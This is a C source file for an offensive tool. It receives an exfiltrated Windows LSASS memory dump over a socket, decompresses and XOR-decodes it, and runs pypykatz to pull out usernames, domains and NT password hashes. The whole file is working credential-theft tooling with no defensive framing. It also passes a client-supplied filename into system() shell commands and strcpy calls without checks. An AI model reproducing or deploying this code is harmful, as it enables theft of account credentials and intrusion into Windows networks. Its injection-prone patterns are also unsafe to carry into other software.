#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <getopt.h>
#include <openssl/md5.h>

#define BUFFER_SIZE 4096
#define SEPARATOR "|"

void print_md5_hash(const char *filename);
char* serve(const char *host, int port);
char* extract_zip(const char *zipname, int md5_flag);
void xor_decrypt(const char *datafile, int key);
void parse_dump(const char *datafile);

int main(int argc, char *argv[]) {
    const char *host = NULL;
    int port = -1;
    int xor_key = -1;
    int md5_flag = 0;
    int parse_flag = 0;

    int opt;
    struct option long_options[] = {
        {"xor", required_argument, NULL, 'x'},
        {"md5", no_argument, NULL, 'm'},
        {"parse", no_argument, NULL, 'p'},
        {NULL, 0, NULL, 0}
    };

    while ((opt = getopt_long(argc, argv, "x:mp", long_options, NULL)) != -1) {
        switch (opt) {
            case 'x':
                xor_key = atoi(optarg);
                if (xor_key < 0 || xor_key > 255) {
                    fprintf(stderr, "XOR key must be between 0 and 255\n");
                    return EXIT_FAILURE;
                }
                break;
            case 'm':
                md5_flag = 1;
                break;
            case 'p':
                parse_flag = 1;
                break;
            default:
                fprintf(stderr, "Usage: %s host port [--xor key] [--md5] [--parse]\n", argv[0]);
                return EXIT_FAILURE;
        }
    }

    if (argc - optind < 2) {
        fprintf(stderr, "Usage: %s host port [--xor key] [--md5] [--parse]\n", argv[0]);
        return EXIT_FAILURE;
    }

    host = argv[optind++];
    port = atoi(argv[optind++]);

    if (port == 0) {
        fprintf(stderr, "Invalid port number\n");
        return EXIT_FAILURE;
    }

    char *zipname = serve(host, port);
    if (zipname == NULL) {
        return EXIT_FAILURE;
    }

    char *datafile = extract_zip(zipname, md5_flag);
    free(zipname);
    if (datafile == NULL) {
        return EXIT_FAILURE;
    }

    if (xor_key != -1) {
        xor_decrypt(datafile, xor_key);
    }

    if (parse_flag) {
        parse_dump(datafile);
    }

    free(datafile);

    return EXIT_SUCCESS;
}

char* serve(const char *host, int port) {
    int server_fd, client_fd;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE];
    char filename[256];
    long filesize;

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        return NULL;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(host);
    address.sin_port = htons(port);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        close(server_fd);
        return NULL;
    }

    if (listen(server_fd, 5) < 0) {
        perror("listen failed");
        close(server_fd);
        return NULL;
    }
    printf("Serving socket server on %s port %d ...\n", host, port);

    if ((client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
        perror("accept failed");
        close(server_fd);
        return NULL;
    }
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    getpeername(client_fd, (struct sockaddr *)&client_addr, &client_addr_len);
    char client_ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip_str, INET_ADDRSTRLEN);
    int client_port = ntohs(client_addr.sin_port);

    printf("[+] Received connection from %s:%d\n", client_ip_str, client_port);

    memset(buffer, 0, BUFFER_SIZE);
    int valread = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
    if (valread < 0) {
        perror("recv failed");
        close(client_fd);
        close(server_fd);
        return NULL;
    }

    char *separator_ptr = strstr(buffer, SEPARATOR);
    if (separator_ptr == NULL) {
        fprintf(stderr, "Separator not found in received data\n");
        close(client_fd);
        close(server_fd);
        return NULL;
    }

    *separator_ptr = '\0';
    strcpy(filename, buffer);
    filesize = atol(separator_ptr + strlen(SEPARATOR));

    snprintf(filename, sizeof(filename), "%s.zip", filename);
    printf("[*] Started downloading LSASS dump...\n");

    FILE *fp = fopen(filename, "wb");
    if (fp == NULL) {
        perror("fopen failed");
        close(client_fd);
        close(server_fd);
        return NULL;
    }

    long bytes_received = 0;
    while (bytes_received < filesize) {
        memset(buffer, 0, BUFFER_SIZE);
        valread = recv(client_fd, buffer, BUFFER_SIZE, 0);
        if (valread < 0) {
            perror("recv failed");
            fclose(fp);
            remove(filename);
            close(client_fd);
            close(server_fd);
            return NULL;
        }
        if (valread == 0) {
            break;
        }
        fwrite(buffer, 1, valread, fp);
        bytes_received += valread;
        printf("[*] Downloaded %ld / %ld bytes\r", bytes_received, filesize);
        fflush(stdout);
    }
    printf("\n"); 
    fclose(fp);
    close(client_fd);
    close(server_fd);

    char *ret_filename = strdup(filename);
    return ret_filename;
}


char* extract_zip(const char *zipname, int md5_flag) {
    if (md5_flag) {
        print_md5_hash(zipname);
    }

    char extracted_name[256];
    char new_name[256];
    char command[512];

    snprintf(command, sizeof(command), "unzip -o %s", zipname);
    if (system(command) != 0) {
        fprintf(stderr, "Error extracting zip file %s\n", zipname);
        return NULL;
    }

    char *zip_base_name = strdup(zipname);
    char *dot_zip = strstr(zip_base_name, ".zip");
    if (dot_zip != NULL) {
        *dot_zip = '\0';
    }
    strcpy(extracted_name, zip_base_name); //Extracted name assumed to be base name of zip
    free(zip_base_name);


    strcpy(new_name, zipname);
    char *dot_ptr = strstr(new_name, ".zip");
    if (dot_ptr != NULL) {
        strcpy(dot_ptr, ".dmp");
    }

    if (rename(extracted_name, new_name) != 0) {
        perror("rename failed");
        remove(zipname);
        return NULL;
    }

    printf("[+] %s was extracted to %s\n", zipname, new_name);
    remove(zipname);

    char *ret_new_name = strdup(new_name);
    return ret_new_name;
}

void print_md5_hash(const char *filename) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        perror("Error opening file for MD5 hash");
        return;
    }

    MD5_CTX md5_context;
    MD5_Init(&md5_context);
    unsigned char buffer[BUFFER_SIZE];
    size_t bytes;

    while ((bytes = fread(buffer, 1, BUFFER_SIZE, file)) != 0) {
        MD5_Update(&md5_context, buffer, bytes);
    }

    if (ferror(file)) {
        perror("Error reading file for MD5 hash");
        fclose(file);
        return;
    }

    unsigned char md5_digest[MD5_DIGEST_LENGTH];
    MD5_Final(md5_digest, &md5_context);
    fclose(file);

    printf("[*] MD5: ");
    for (int i = 0; i < MD5_DIGEST_LENGTH; i++) {
        printf("%02x", md5_digest[i]);
    }
    printf("\n");
}


void xor_decrypt(const char *datafile, int key) {
    FILE *file = fopen(datafile, "rb+");
    if (!file) {
        perror("Error opening file for XOR decryption");
        return;
    }

    unsigned char buffer[BUFFER_SIZE];
    size_t bytes;
    long file_size = 0;

    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    fseek(file, 0, SEEK_SET);


    for(long i = 0; i < file_size; i += BUFFER_SIZE) {
        bytes = fread(buffer, 1, BUFFER_SIZE, file);
        if (bytes == 0 && ferror(file)) {
            perror("Error reading file for XOR decryption");
            fclose(file);
            return;
        }

        for (size_t j = 0; j < bytes; j++) {
            buffer[j] ^= key;
        }

        fseek(file, i, SEEK_SET); 
        fwrite(buffer, 1, bytes, file);
    }

    fclose(file);
    printf("[+] %s was XOR-decrypted with key 0x%02x\n", datafile, key);
}

void parse_dump(const char *datafile) {
    char parsed_name[256];
    char command[512];

    strcpy(parsed_name, datafile);
    char *dot_ptr = strstr(parsed_name, ".dmp");
    if (dot_ptr != NULL) {
        strcpy(dot_ptr, ".parsed");
    }

    printf("[=] Parsing with pypykatz...\n");
    snprintf(command, sizeof(command), "pypykatz lsa minidump %s > %s", datafile, parsed_name);
    if (system(command) != 0) {
        fprintf(stderr, "Error executing pypykatz. Make sure it's installed and in PATH.\n");
        return;
    }
    printf("[+] Hashes:\n");
    snprintf(command, sizeof(command), "grep -a -P 'Username: ' %s -A4 | grep -a -e Username -e Domain -e NT | grep -a -v None", parsed_name);
    system(command);
}

